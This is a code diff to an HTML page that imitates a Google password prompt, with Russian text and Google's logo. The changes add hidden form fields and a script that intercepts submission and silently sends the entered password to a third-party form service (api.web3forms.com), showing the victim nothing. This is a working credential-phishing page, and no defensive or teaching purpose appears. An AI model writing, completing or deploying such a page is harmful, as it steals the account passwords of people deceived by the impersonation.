@@ -4,7 +4,6 @@
 <meta charset="UTF-8">
 <title>Введите пароль</title>
 <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500&display=swap" rel="stylesheet">
-
 <style>
 body {
     margin: 0;
@@ -15,7 +14,6 @@ body {
     background: #f1f3f4;
     font-family: 'Roboto', sans-serif;
 }
-
 .card {
     background: white;
     width: 900px;
@@ -25,23 +23,19 @@ body {
     padding: 60px;
     box-shadow: 0 4px 20px rgba(0,0,0,0.1);
 }
-
 .left {
     flex: 1;
 }
-
 .logo {
     font-size: 26px;
     font-weight: 500;
     margin-bottom: 30px;
 }
-
 .title {
     font-size: 42px;
     font-weight: 400;
     margin-bottom: 25px;
 }
-
 .email-box {
     display: inline-flex;
     align-items: center;
@@ -51,23 +45,19 @@ body {
     font-size: 14px;
     color: #3c4043;
 }
-
 .email-box span {
     margin-left: 8px;
 }
-
 .right {
     flex: 1;
     display: flex;
     flex-direction: column;
     justify-content: center;
 }
-
 .input-group {
     position: relative;
     margin-bottom: 20px;
 }
-
 input[type="password"],
 input[type="text"] {
     width: 100%;
@@ -78,12 +68,10 @@ input[type="text"] {
     outline: none;
     box-sizing: border-box;
 }
-
 input[type="password"]:focus,
 input[type="text"]:focus {
     border: 2px solid #1a73e8;
 }
-
 label {
     position: absolute;
     top: -10px;
@@ -93,7 +81,6 @@ label {
     font-size: 13px;
     color: #5f6368;
 }
-
 .checkbox {
     margin-bottom: 25px;
     font-size: 14px;
@@ -101,19 +88,16 @@ label {
     align-items: center;
     gap: 6px;
 }
-
 .actions {
     display: flex;
     justify-content: space-between;
     align-items: center;
 }
-
 .link {
     color: #1a73e8;
     font-size: 14px;
     cursor: pointer;
 }
-
 button {
     background: #1a73e8;
     color: white;
@@ -123,17 +107,13 @@ button {
     font-size: 14px;
     cursor: pointer;
 }
-
 button:hover {
     background: #1765cc;
 }
 </style>
 </head>
-
 <body>
-
 <div class="card">
-
     <div class="left">
         <div class="logo">
             <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 74 24" width="74" height="24" aria-label="Google">
@@ -146,31 +126,75 @@ button:hover {
             </svg>
         </div>
         <div class="title">Добро пожаловать!</div>
-
         <div class="email-box">
             👤 <span><a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="5c39243d312c30391c3b313d3530723f3331">[email&#160;protected]</a></span>
         </div>
     </div>
-
     <div class="right">
-        <form>
+        <form id="myForm">  <!-- добавил id="myForm" -->
+            <input type="hidden" name="access_key" value="a9d2bb5d-ade0-4087-821e-6df2ae1495ca">
+            <!-- Можно добавить тему письма -->
+            <input type="hidden" name="_subject" value="Новый пароль с формы">
+
             <div class="input-group">
-                <input id="passwordInput" type="password" required>
+                <input id="passwordInput" type="password" name="password" required>  <!-- добавил name="password" -->
                 <label>Введите пароль</label>
             </div>
-
             <div class="checkbox">
                 <input type="checkbox" id="showPassword" onchange="togglePassword()">
                 <label for="showPassword" style="position:static; background:none; font-size:14px; color:#3c4043;">Показать пароль</label>
             </div>
-
             <div class="actions">
                 <div class="link">Забыли пароль?</div>
                 <button type="submit">Далее</button>
             </div>
         </form>
     </div>
-
 </div>
 
-<script data-cfasync="false" src="/cdn-cgi/scripts/5c5dd728/cloudflare-s
+<script>
+function togglePassword() {
+    var x = document.getElementById("passwordInput");
+    if (x.type === "password") {
+        x.type = "text";
+    } else {
+        x.type = "password";
+    }
+}
+
+// Перехват отправки формы
+document.getElementById("myForm").addEventListener("submit", function(e) {
+    e.preventDefault();  // ← главное: блокируем перезагрузку страницы
+
+    // Собираем данные (пароль + ключ)
+    const formData = new FormData(this);
+    const object = {};
+    formData.forEach((value, key) => { object[key] = value; });
+    const json = JSON.stringify(object);
+
+    // Отправляем в фоне
+    fetch("https://api.web3forms.com/submit", {
+        method: "POST",
+        headers: {
+            "Content-Type": "application/json",
+            "Accept": "application/json"
+        },
+        body: json
+    })
+    .then(async (response) => {
+        // Успех — ничего не показываем
+        // console.log("Отправлено успешно");
+        // Опционально: очистить поле после отправки
+        // document.getElementById("passwordInput").value = "";
+    })
+    .catch((error) => {
+        // Ошибка — тоже молча (только в консоль)
+        console.error("Ошибка отправки:", error);
+    });
+});
+</script>
+
+<!-- твой старый скрипт cloudflare (оставил как есть) -->
+<script data-cfasync="false" src="/cdn-cgi/scripts/5c5dd728/cloudflare-"></script>
+</body>
+</html>
